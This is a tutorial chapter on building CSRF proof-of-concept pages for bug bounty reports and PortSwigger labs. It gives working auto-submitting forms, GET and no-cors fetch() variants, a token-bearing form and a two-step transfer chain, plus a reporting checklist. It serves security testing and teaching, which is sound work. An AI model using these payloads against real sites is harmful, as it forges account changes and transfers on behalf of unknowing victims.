# 04 — Building a Working CSRF Proof-of-Concept

## 1. Why this file matters for bug bounty work specifically

Most CSRF report rejections on HackerOne and Bugcrowd are not because the
vulnerability is fake — they're because the PoC doesn't actually demonstrate it
working end-to-end. A report that says "this endpoint has no CSRF token" without an
attached, working exploit page is treated as low-confidence by most triagers and
frequently bounced back with "please provide a working PoC." This file covers how to
build one correctly for every common request shape, and how to deliver it.

## 2. The baseline pattern: auto-submitting form for a simple POST

This is the form every other variant in this file is a modification of. Memorize the
mechanism, not just the snippet.

```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="attacker-controlled@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Line by line:

- `<form action="..." method="POST">` — must match the target endpoint's exact path
  and HTTP method. Get the method wrong (GET when the server expects POST) and the
  PoC will not reproduce the bug, even if the vulnerability is real.
- `<input type="hidden" name="email" value="..." />` — one hidden input per
  parameter the real request body contains. The `name` attribute must match the
  real parameter name byte-for-byte (case-sensitive in almost all frameworks).
  `type="hidden"` keeps the field invisible to the victim — they should never see a
  form on screen.
- `document.forms[0].submit()` — `document.forms` is a live collection of every
  `<form>` element on the page, in source order; `[0]` selects the first one. Calling
  `.submit()` programmatically triggers form submission exactly as if a user had
  clicked a submit button, without requiring one to exist or be clicked.
- This script runs the instant the page finishes loading (since it's placed at the
  end of `<body>`, after the form already exists in the DOM) — no further victim
  interaction is needed.
- **What the browser actually sends:** a normal cross-site POST to
  `vulnerable-website.com`, with the form fields URL-encoded in the body as
  `Content-Type: application/x-www-form-urlencoded`, and the victim's existing
  session cookie for that domain automatically attached by the browser (assuming no
  SameSite restriction blocks it — see file 03).

## 3. PoC for a GET-based action

```html
<html>
  <body>
    <img src="https://vulnerable-website.com/email/change?email=attacker-controlled@evil-user.net" style="display:none">
  </body>
</html>
```

Or, if you want a guaranteed top-level navigation (relevant when the target relies
on SameSite=Lax, per file 03 section 4, since `<img>` is a background request and
does **not** count as top-level navigation):

```html
<script>
    document.location = 'https://vulnerable-website.com/email/change?email=attacker-controlled@evil-user.net';
</script>
```

Breakdown of the difference between these two, and why it matters:

- The `<img>` version issues a background GET request — the browser fetches it the
  same way it fetches any image resource, without changing the visible page or
  address bar. This is stealthier (the victim's page never navigates away) but is
  **not** a top-level navigation, so it will **not** carry a `SameSite=Lax` cookie.
- The `document.location` version performs a genuine top-level navigation — the
  victim's browser visibly navigates to the target URL. This **does** satisfy
  `SameSite=Lax`'s top-level-navigation requirement, at the cost of being visible to
  the victim (their browser tab changes to the target site, which they may notice).
- Choose based on what you're demonstrating: use `<img>` for a no-SameSite-defense
  target where stealth matters for impact framing; use `document.location` when the
  point of the PoC is specifically to demonstrate a `Lax` bypass.

## 4. PoC for a request that requires a CSRF token you've obtained

Combine the standard form pattern with a token value obtained per the techniques in
file 02 (e.g. a token from your own account that isn't session-bound, or a value
you've planted via a cookie-setting gadget):

```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="csrf" value="Tx9f2KpL8eR4hQ6wN1zVbC3jD7sM0aGu" />
      <input type="hidden" name="email" value="attacker-controlled@evil-user.net" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

- Only the addition of `<input type="hidden" name="csrf" value="...">` differs from
  the baseline pattern. The value here is **not** placeholder text — it must be a
  real value obtained through one of the binding-flaw techniques in file 02, or the
  request will be rejected exactly as a normal forged request would be.
- If the token is single-use (consumed after one successful request, as is common in
  PortSwigger labs), you must re-fetch a fresh token immediately before delivering
  the final exploit — a stale token in your PoC will fail even though the underlying
  vulnerability is real. Always note in your testing process: "tokens are single-use,
  refresh before final delivery" so you don't waste a delivery attempt.

## 5. PoC for a JSON-body endpoint (SPA/API-style requests)

Standard HTML forms can only send `application/x-www-form-urlencoded`,
`multipart/form-data`, or plain `text/plain` bodies — they cannot natively send
`application/json`. If the target API only accepts JSON and validates
`Content-Type: application/json` strictly, a plain form won't trigger the handler at
all. Two approaches:

**Approach A — `fetch()` with credentials, when no CORS restriction blocks it:**

```html
<html>
  <body>
    <script>
      fetch('https://vulnerable-website.com/api/email/change', {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify({ email: 'attacker-controlled@evil-user.net' })
      });
    </script>
  </body>
</html>
```

- `credentials: 'include'` instructs the browser to attach cookies for the target
  domain to this cross-origin `fetch()` call — without this, `fetch()` would not
  send the session cookie at all, even though `<form>` submissions and `<img>` tags
  always do by default.
- `mode: 'no-cors'` is deliberately used here. This tells the browser the script
  doesn't need to read the response (true for a blind CSRF attack) — it allows the
  request to be sent even though the response would otherwise be blocked from being
  read due to CORS, since the attacker's origin isn't whitelisted. The request still
  gets to the server and still executes server-side, even though the attacker's
  script can't see the result.
- `headers: { 'Content-Type': 'text/plain' }` is a deliberate trick: `no-cors`
  requests are restricted to a small set of "simple" content types
  (`text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`). Setting
  `text/plain` avoids triggering a CORS preflight (`OPTIONS`) request, which would
  otherwise be sent first and could be blocked. This only works if the **server**
  doesn't strictly enforce `Content-Type: application/json` — many JSON-parsing
  middlewares will parse a `text/plain` body as JSON anyway if the body content
  itself is valid JSON, which is exactly the gap this exploits.
- `body: JSON.stringify(...)` — the actual JSON payload, sent as the raw text body.

**Approach B — if the server strictly requires `Content-Type: application/json` and
rejects anything else,** this specific bypass does not work, and the endpoint is
likely **not** exploitable via classic CSRF at all — note this honestly in your
report rather than forcing a non-working PoC. This is, in fact, one of the reasons
some developers deliberately require JSON content-type as a CSRF mitigation: it's a
real (if accidental) defense, since the request can't be triggered without
JavaScript that the SOP / CORS rules will then constrain.

## 6. PoC for a multi-step / two-request flow

Some sensitive actions require two requests — e.g. first fetching a one-time
confirmation code or a fresh token, then submitting the actual change. A single
auto-submit form can't do this; you need sequenced requests, which means JavaScript
orchestration rather than a plain form:

```html
<html>
  <body>
    <form id="step1" action="https://vulnerable-website.com/initiate-transfer" method="POST">
      <input type="hidden" name="amount" value="1000000" />
    </form>
    <script>
      document.getElementById('step1').submit();
    </script>
  </body>
</html>
```

Hosted as the **first** page in the chain, then, on the page the first request
redirects to (or via a `fetch()`-then-form-submit sequence if you control timing
without a redirect), a second auto-submitting form completes the flow:

```html
<html>
  <body>
    <form id="step2" action="https://vulnerable-website.com/confirm-transfer" method="POST">
      <input type="hidden" name="confirm" value="true" />
    </form>
    <script>
      document.getElementById('step2').submit();
    </script>
  </body>
</html>
```

Breakdown of the orchestration logic:

- `id="step1"` / `getElementById('step1')` — used instead of `document.forms[0]`
  here purely for clarity when you might have more than one form on a page during
  multi-step chains; functionally equivalent to the array-index approach.
- If the application's own first-step response causes a redirect to a second page
  on the application (the normal flow for a real user), you generally don't need to
  build the second-page PoC yourself — the browser will follow the app's own
  redirect and land on the genuine confirmation page, which the victim would then
  need to interact with normally, breaking the "fully automatic, no interaction"
  property of the exploit. If full automation across both steps is required for the
  attack to be credible, you typically need to host your own second exploit page and
  use a timed `window.location` change, or `fetch()` for step 1 followed
  immediately by an auto-submitting form for step 2 on the *same* attacker page.
- Document any timing dependency (e.g. "requires the confirmation code is not
  actually validated, only its presence is checked") explicitly and honestly in the
  report — multi-step CSRF PoCs are exactly where claims tend to get overstated.

## 7. Using the PortSwigger exploit server (lab environment specifics)

When working PortSwigger Academy labs, you don't host your own infrastructure — the
Academy provides an "exploit server" per lab:

1. Build your PoC HTML using the patterns above, substituting `YOUR-LAB-ID` with the
   actual lab subdomain shown in your browser's address bar.
2. Navigate to the lab's exploit server (a fixed URL pattern,
   `https://exploit-<labid>.exploit-server.net`, accessible via a link on the lab
   page).
3. Paste the HTML into the **Body** field of the exploit server's form.
4. Click **Store** — this hosts the page at the exploit server's own domain, giving
   you a genuinely separate origin from the lab target, which is necessary for the
   cross-site mechanics to actually apply (testing by pasting the HTML into your own
   browser's address bar as a `data:` URI or a local file does not reproduce
   cross-site behavior correctly).
5. Click **View exploit** to test the PoC against your own logged-in session first —
   confirm the intended action actually fires before involving the simulated victim.
6. Click **Deliver exploit to victim** to have the lab's simulated victim (already
   authenticated on the target) visit your hosted page and trigger the request with
   their session.

**Burp Suite Professional shortcut:** right-click any captured request → Engagement
tools → Generate CSRF PoC. This auto-generates HTML equivalent to section 2 above,
with toggles for including an auto-submit script — useful for quickly confirming
classic CSRF, though you'll still need to hand-build PoCs for the token/SameSite
bypass variants covered in files 02–03, since the generator only recreates the
original request, not a forged-token or cookie-planting attack chain.

## 8. Report-writing checklist for a CSRF PoC

Before submitting a finding, confirm:

- [ ] The PoC is hosted on a genuinely separate origin (not the same domain, not a
  local file) — this is non-negotiable for credibility.
- [ ] You tested the PoC against your own account first and confirmed the action
  fired, before claiming it works against a victim.
- [ ] The PoC changes a value to something **clearly attacker-controlled and
  distinguishable**, not your own real account's value — e.g. an email you control,
  not a re-submission of the victim's existing value, so impact is unambiguous.
- [ ] If a token is involved, you've noted whether it's single-use and refreshed it
  immediately before final delivery.
- [ ] You've stated explicitly which browser and version you tested with, since
  SameSite enforcement specifics are browser-version-dependent (file 03).
- [ ] The write-up states the concrete business impact (account takeover, financial
  loss, privilege escalation) — not just "missing CSRF token."
- [ ] If the bug only becomes exploitable through a chained vulnerability (stored
  XSS, an open redirect, a cookie-setting gadget, CORS misconfiguration), the report
  names the root cause first and frames CSRF as the demonstrated impact, per the
  reporting notes in files 01–03.
- [ ] You've checked the program's scope/exclusions for CSRF-specific carve-outs
  (e.g. "CSRF on logout is out of scope") before submitting.

## 9. Real-world notes

- In client engagements (as opposed to public bug bounty), it's standard practice to
  deliver the PoC as a self-contained `.html` file attachment in the report rather
  than relying on a hosted demo link, since client environments often can't reach
  external attacker-controlled infrastructure during review — the developer should
  be able to open the file locally (from a separate origin context, e.g.
  `file://` or a throwaway local server) and reproduce the issue without depending on
  your infrastructure staying online.
- A common mistake when building PoCs against real (non-lab) targets: forgetting
  that production WAFs or CDNs sometimes block requests with no `Referer` header or
  with a `Referer` from an unrecognized domain — even when there's no formal
  Referer-based CSRF check, edge infrastructure can interfere. Always note whether
  the PoC was tested against the raw application or through whatever CDN/WAF
  fronts it in production.
- Avoid demonstrating destructive PoCs (e.g. account deletion) against your own
  production test accounts without a clear understanding of how to undo the action —
  plan reversible test cases (email change to a value you control, rather than
  irreversible account deletion) wherever the vulnerability allows it.
